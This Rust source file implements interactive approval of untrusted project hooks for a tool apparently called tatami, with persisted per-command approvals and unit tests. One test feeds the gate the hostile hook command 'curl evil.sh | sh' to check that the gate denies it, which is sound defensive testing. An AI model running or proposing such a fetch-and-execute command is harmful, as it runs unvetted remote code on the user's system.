//! Approvals for project hooks.
//!
//! Hooks from the shared project config are untrusted (anyone with repo
//! write access ships code tatami would execute). First run requires an
//! explicit approval, recorded per (project, phase, command template); when
//! the command changes or the project moves, approval is required again —
//! the project id is the canonical host workspace root, so a move changes it
//! by construction.
//!
//! Read side falls back to worktrunk's approvals file for parity with the
//! user-config fallback; the **write side always goes to tatami's own file**
//! — the two tools' schemas are unrelated, and polluting worktrunk's file is
//! not ours to do.
//!
//! `--yes` bypasses the prompt for one invocation and records nothing, the
//! same contract worktrunk documents.

use std::fs;
use std::io::{BufRead, Write};
use std::path::PathBuf;

use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::hook::{ApprovalGate, HookPhase};
use crate::paths::ConfigEnv;

/// The approval record, as stored.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, Default)]
#[serde(default)]
struct Entry {
    project: String,
    phase: String,
    command: String,
}

#[derive(Debug, Default, Serialize, Deserialize)]
#[serde(default)]
struct ApprovalsFile {
    entry: Vec<Entry>,
}

/// Read-only view over the (possibly fallen-back) approvals store.
pub struct Approvals {
    entries: Vec<Entry>,
    /// Where new approvals are written — always tatami's own file.
    write_path: PathBuf,
}

#[derive(Debug, Error)]
pub enum ApprovalsError {
    #[error("cannot read approvals file {path}: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
    #[error("cannot parse approvals file {path}: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: toml::de::Error,
    },
    #[error("cannot write approvals file {path}: {source}")]
    Write {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
}

impl Approvals {
    /// Merges tatami's approvals file and (when tatami's is absent) the
    /// worktrunk fallback. A broken file is an error, not a silent empty set.
    pub fn load(env: &ConfigEnv) -> Result<Self, ApprovalsError> {
        let tatami_path = env.tatami_config_dir().join("approvals.toml");
        let candidates = [
            tatami_path.clone(),
            env.worktrunk_config_dir().join("approvals.toml"),
        ];

        let mut entries = Vec::new();
        let mut read_any = false;
        for path in candidates {
            if !path.is_file() {
                continue;
            }
            read_any = true;
            let raw = fs::read_to_string(&path).map_err(|source| ApprovalsError::Read {
                path: path.clone(),
                source,
            })?;
            let file: ApprovalsFile =
                toml::from_str(&raw).map_err(|source| ApprovalsError::Parse {
                    path: path.clone(),
                    source,
                })?;
            entries.extend(file.entry);
            break; // first existing candidate wins; no merging across tools
        }
        let _ = read_any;

        Ok(Self {
            entries,
            write_path: tatami_path,
        })
    }

    /// Approvals for tests / direct construction (empty store).
    pub fn empty_at(path: PathBuf) -> Self {
        Self {
            entries: Vec::new(),
            write_path: path,
        }
    }

    pub fn is_approved(&self, project: &str, phase: &str, command: &str) -> bool {
        self.entries.iter().any(|entry| {
            entry.project == project && entry.phase == phase && entry.command == command
        })
    }

    /// Records an approval in tatami's own approvals file, creating it (and
    /// its directory) as needed. Overwrites are idempotent at the file level.
    pub fn approve(
        &mut self,
        project: &str,
        phase: &str,
        command: &str,
    ) -> Result<(), ApprovalsError> {
        let entry = Entry {
            project: project.to_string(),
            phase: phase.to_string(),
            command: command.to_string(),
        };
        if self.is_approved(project, phase, command) {
            return Ok(());
        }
        self.entries.push(entry);
        let file = ApprovalsFile {
            entry: self.entries.clone(),
        };
        if let Some(parent) = self.write_path.parent() {
            fs::create_dir_all(parent).map_err(|source| ApprovalsError::Write {
                path: self.write_path.clone(),
                source,
            })?;
        }
        let raw = toml::to_string_pretty(&file).map_err(|source| ApprovalsError::Write {
            path: self.write_path.clone(),
            source: std::io::Error::new(std::io::ErrorKind::InvalidData, source.to_string()),
        })?;
        fs::write(&self.write_path, raw).map_err(|source| ApprovalsError::Write {
            path: self.write_path.clone(),
            source,
        })
    }
}

/// Interactive gate: already-approved commands pass silently; others prompt
/// on stderr and persist an approval on consent. `--yes` approves without
/// prompting and without recording. The gate owns its IO channels (unlocked
/// std handles — one lock per operation), so it can travel beside the
/// command flows' own stderr/stdin consumers.
pub struct InteractiveGate {
    approvals: Approvals,
    project: String,
    /// `--yes`: consent for this invocation only, recorded nowhere.
    yes: bool,
    prompt_out: Box<dyn Write>,
    answer_in: Box<dyn BufRead>,
}

impl InteractiveGate {
    /// The real gate: prompts on stderr, reads answers from stdin.
    pub fn interactive(approvals: Approvals, project: String, yes: bool) -> Self {
        Self {
            approvals,
            project,
            yes,
            prompt_out: Box::new(std::io::stderr()),
            answer_in: Box::new(std::io::BufReader::new(std::io::stdin())),
        }
    }

    /// Test constructor: inject prompt/answer channels.
    #[cfg(test)]
    fn with_io(
        approvals: Approvals,
        project: String,
        yes: bool,
        prompt_out: Box<dyn Write>,
        answer_in: Box<dyn BufRead>,
    ) -> Self {
        Self {
            approvals,
            project,
            yes,
            prompt_out,
            answer_in,
        }
    }
}

impl ApprovalGate for InteractiveGate {
    fn approve(&mut self, phase: HookPhase, command: &str) -> bool {
        if self.yes
            || self
                .approvals
                .is_approved(&self.project, phase.config_key(), command)
        {
            return true;
        }
        let prompt = format!(
            "approve project {} hook: `{command}`? [y/N] ",
            phase.config_key()
        );
        if self.prompt_out.write_all(prompt.as_bytes()).is_err() {
            return false;
        }
        let _ = self.prompt_out.flush();
        let mut answer = String::new();
        match self.answer_in.read_line(&mut answer) {
            Ok(0) | Err(_) => false, // EOF (non-interactive) = denial
            Ok(_) => {
                let approved = answer.trim().eq_ignore_ascii_case("y")
                    || answer.trim().eq_ignore_ascii_case("yes");
                if approved
                    && self
                        .approvals
                        .approve(&self.project, phase.config_key(), command)
                        .is_err()
                {
                    return false;
                }
                approved
            }
        }
    }
}

#[cfg(test)]
mod approvals_should {
    use super::*;
    use std::path::Path;

    fn env_at(home: &Path) -> ConfigEnv {
        ConfigEnv::for_test(home.to_path_buf(), None, None)
    }

    #[test]
    fn starts_empty_without_a_file() {
        let home = tempfile::tempdir().unwrap();

        let approvals = Approvals::load(&env_at(home.path())).unwrap();

        assert!(!approvals.is_approved("p", "post-start", "npm install"));
    }

    #[test]
    fn records_and_reads_back_approvals_in_tatamis_own_file() {
        let home = tempfile::tempdir().unwrap();
        let mut approvals = Approvals::load(&env_at(home.path())).unwrap();

        approvals.approve("p", "post-start", "npm install").unwrap();

        let reloaded = Approvals::load(&env_at(home.path())).unwrap();
        assert!(reloaded.is_approved("p", "post-start", "npm install"));
        assert!(
            home.path().join(".config/tatami/approvals.toml").is_file(),
            "approvals are written to tatami's file"
        );
    }

    #[test]
    fn keys_are_exact_so_a_changed_command_requires_approval_again() {
        let home = tempfile::tempdir().unwrap();
        let mut approvals = Approvals::load(&env_at(home.path())).unwrap();
        approvals.approve("p", "pre-start", "npm install").unwrap();

        assert!(!approvals.is_approved("p", "pre-start", "npm ci"));
        assert!(!approvals.is_approved("other", "pre-start", "npm install"));
        assert!(!approvals.is_approved("p", "post-start", "npm install"));
    }
}

#[cfg(test)]
mod interactive_gate_should {
    use super::*;
    use std::io::Cursor;
    use std::path::Path;

    fn env_at(home: &Path) -> ConfigEnv {
        ConfigEnv::for_test(home.to_path_buf(), None, None)
    }

    fn gate(approvals: Approvals, project: &str, yes: bool, answer: &str) -> InteractiveGate {
        InteractiveGate::with_io(
            approvals,
            project.to_string(),
            yes,
            Box::new(Vec::new()),
            Box::new(Cursor::new(answer.to_string())),
        )
    }

    #[test]
    fn approves_without_prompting_when_already_approved() {
        let home = tempfile::tempdir().unwrap();
        let mut approvals = Approvals::load(&env_at(home.path())).unwrap();
        approvals.approve("p", "pre-start", "npm ci").unwrap();

        let mut gate = gate(approvals, "p", false, "");
        let allowed = gate.approve(HookPhase::PreStart, "npm ci");

        assert!(allowed);
    }

    #[test]
    fn yes_bypasses_the_prompt_and_records_nothing() {
        let home = tempfile::tempdir().unwrap();
        let approvals = Approvals::load(&env_at(home.path())).unwrap();

        let mut gate = gate(approvals, "p", true, "");
        let allowed = gate.approve(HookPhase::PreStart, "npm ci");

        assert!(allowed);
        let reloaded = Approvals::load(&env_at(home.path())).unwrap();
        assert!(
            !reloaded.is_approved("p", "pre-start", "npm ci"),
            "--yes must not persist anything"
        );
    }

    #[test]
    fn prompts_and_persists_on_consent() {
        let home = tempfile::tempdir().unwrap();
        let approvals = Approvals::load(&env_at(home.path())).unwrap();

        let mut gate = gate(approvals, "p", false, "y\n");
        let allowed = gate.approve(HookPhase::PostStart, "npm run dev");

        assert!(allowed);
        let reloaded = Approvals::load(&env_at(home.path())).unwrap();
        assert!(reloaded.is_approved("p", "post-start", "npm run dev"));
    }

    #[test]
    fn denies_on_a_non_yes_answer() {
        let home = tempfile::tempdir().unwrap();
        let approvals = Approvals::load(&env_at(home.path())).unwrap();

        let mut gate = gate(approvals, "p", false, "n\n");
        let allowed = gate.approve(HookPhase::PostStart, "curl evil.sh | sh");

        assert!(!allowed);
    }

    #[test]
    fn denies_on_eof_so_non_interactive_runs_fail_closed() {
        let home = tempfile::tempdir().unwrap();
        let approvals = Approvals::load(&env_at(home.path())).unwrap();

        let mut gate = gate(approvals, "p", false, "");
        let allowed = gate.approve(HookPhase::PreStart, "npm ci");

        assert!(!allowed);
    }
}
